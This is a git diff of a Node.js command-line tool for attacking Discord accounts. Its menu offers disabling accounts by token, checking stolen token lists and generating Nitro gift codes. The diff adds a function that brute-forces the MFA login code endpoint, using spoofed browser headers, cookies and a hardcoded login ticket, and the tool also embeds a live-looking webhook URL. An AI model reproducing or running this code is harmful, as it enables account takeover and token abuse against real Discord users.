@@ -1,10 +1,11 @@
 /* imports & stuff */
-import https from "https"
+import fs from "fs";
+import https from "https";
 import { Webhook } from "discord-webhook-node";
 import fetch from "node-fetch";
 import readline from "readline";
 import { stdin as input, stdout as output } from 'node:process';
-import request from "request"
+import request from "request";
 const rl = readline.createInterface({ input, output });
 /* globals & funcs */
 //testing webhook: https://discord.com/api/webhooks/912467556084899870/-0Db2ZiTzZ3ppI_wc5gB0grTSuNH99W5ipk5uXhWO-B-AMtapByS6Yuk9zTQOLvVRZLc
@@ -40,7 +41,7 @@ function help() {
   console.log(`${MAGENTA}5)${BLUE} userid lookup ${BLUE} | ${GREEN} gets info on a discord userid | ${CYAN} Syntax: userid lookup <ID>`);
   console.log(`${MAGENTA}6)${BLUE} disable token ${BLUE} | ${GREEN} deletes a discord account by token | ${CYAN} Syntax: disable token <token>`);
   console.log(`${MAGENTA}7)${BLUE} token checker ${BLUE} | ${GREEN} looks for working tokens in a file`);
-  console.log(`${MAGENTA}8)${BLUE} nitro gen ${BLUE} | ${GREEN} generates random nitro codes and checks them | ${CYAN} Syntax: token gen <webhook you want to send the valid code to>`);
+  console.log(`${MAGENTA}8)${BLUE} nitro gen ${BLUE} | ${GREEN} generates random nitro codes and checks them | ${CYAN} Syntax: token gen <webhook to send the valid code to>`);
 
   console.log(`${MAGENTA}9)${RED} clone webpage ${BLUE} | ${GREEN} command-line "view source" | ${CYAN} Syntax: clone webpage <URL>`);
   console.log(`${MAGENTA}10)${RED} ip lookup ${BLUE} | ${GREEN} gets information for an Ipv4 address`);
@@ -78,7 +79,7 @@ async function fetchUser(id){
 console.log(`${MAGENTA} ${JSON.stringify(await response.json(), null, 2)}`)
   return "User information fetched!"
 }
-async function mfaGenerator(){
+function mfaGenerator(){
 const characters ='abcdefghijklmnopqrstuvwxyz0123456789';
 const length = 8;
   let result = ' ';
@@ -87,6 +88,47 @@ const length = 8;
           result += characters.charAt(Math.floor(Math.random() * charactersLength));
       }
 return `${result}`;
+}
+async function mfaBruteForcer(token){
+let codes = 10000;
+//for (let i = 0; i < codes; i++){
+sleep(2000)
+let code = mfaGenerator();
+fs.readFile("codes.txt", async function (err, data) {
+  if (err) throw err;
+  if(data.includes(`${code}`)){
+  console.log(`invalid code`)
+} else {
+let response = await fetch("https://discord.com/api/v9/auth/mfa/totp", {
+    "headers": {
+      "accept": "*/*",
+      "accept-language": "en-US,en;q=0.9",
+      "authorization": "undefined",
+      "content-type": "application/json",
+      "sec-ch-ua": "\" Not A;Brand\";v=\"99\", \"Chromium\";v=\"98\", \"Google Chrome\";v=\"98\"",
+      "sec-ch-ua-mobile": "?0",
+      "sec-ch-ua-platform": "\"Windows\"",
+      "sec-fetch-dest": "empty",
+      "sec-fetch-mode": "cors",
+      "sec-fetch-site": "same-origin",
+      "x-debug-options": "bugReporterEnabled",
+      "x-discord-locale": "en-US",
+      "x-fingerprint": "943301416150265916.RlU2MLHnjkLPVlsyYS9Jro_tzdM",
+      "x-super-properties": "eyJvcyI6IldpbmRvd3MiLCJicm93c2VyIjoiQ2hyb21lIiwiZGV2aWNlIjoiIiwic3lzdGVtX2xvY2FsZSI6ImVuLVVTIiwiYnJvd3Nlcl91c2VyX2FnZW50IjoiTW96aWxsYS81LjAgKFdpbmRvd3MgTlQgMTAuMDsgV2luNjQ7IHg2NCkgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbykgQ2hyb21lLzk4LjAuNDc1OC44MiBTYWZhcmkvNTM3LjM2IiwiYnJvd3Nlcl92ZXJzaW9uIjoiOTguMC40NzU4LjgyIiwib3NfdmVyc2lvbiI6IjEwIiwicmVmZXJyZXIiOiIiLCJyZWZlcnJpbmdfZG9tYWluIjoiIiwicmVmZXJyZXJfY3VycmVudCI6IiIsInJlZmVycmluZ19kb21haW5fY3VycmVudCI6IiIsInJlbGVhc2VfY2hhbm5lbCI6InN0YWJsZSIsImNsaWVudF9idWlsZF9udW1iZXIiOjExNTI4OSwiY2xpZW50X2V2ZW50X3NvdXJjZSI6bnVsbH0=",
+      "cookie": "_ga=GA1.2.1215842015.1639521180; __dcfduid=a798c970644211ec9e345f50afcd2765; __sdcfduid=a798c971644211ec9e345f50afcd2765c0387bb848a7d7f500efb1495714d1f5c4a20590935fd348a71e1b009f598b12; _gcl_au=1.1.513969801.1640299800; locale=en-US; OptanonConsent=isIABGlobal=false&datestamp=Tue+Feb+15+2022+11%3A26%3A38+GMT-0800+(Pacific+Standard+Time)&version=6.17.0&hosts=&landingPath=NotLandingPage&groups=C0001%3A1%2CC0002%3A1%2CC0003%3A1&AwaitingReconsent=false; __cf_bm=5VWE5XpydiJAHaD.EkR48oMZvNMP8k6l.0e.vZ.bLW8-1645125419-0-AS+6JvvIZnMstmjE1Pe+jgIs//OyIUenH/pDot3nfbxWQPQTEvsy1eNqpeAPYMa4STSAtQ0ysBpsbUdYZWWlGS7CsR3j0LA0bkPQB1pcqzIWmYzi21iJ6cB0FeTd8FVoog==",
+      "Referer": "https://discord.com/login",
+      "Referrer-Policy": "strict-origin-when-cross-origin"
+    },
+    "body": `{\`code\`:\`${code}\`,\`ticket\`:\`${token}\`,"login_source":null,"gift_code_sku_id":null}`,
+    "method": "POST"
+  });
+console.log(response.status)
+console.log(response.json())
+if (response.status == 400){
+fs.writeFile('codes.txt', `${code}\n`, { flag: 'a+' }, err => {})
+}
+}
+});
 }
 function nitroGenerator(){
   const characters ='ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
@@ -209,7 +251,7 @@ rl.pause()
 return "command executed";
 }
 welcome();
-getSource(`https://stackoverflow.com/questions/5801453/in-node-js-express-how-do-i-download-a-page-and-gets-its-html`)
+mfaBruteForcer(`WzU2MzQ3NzY0Njc3Njg2MDY3MiwibG9naW4iXQ.Yg6fLw.rETsY4NjX1lDk-04GwqqzbO8cJY`)
 main().then(console.log()).catch(console.err)
 rl.on('pause', () => {
 rl.resume()
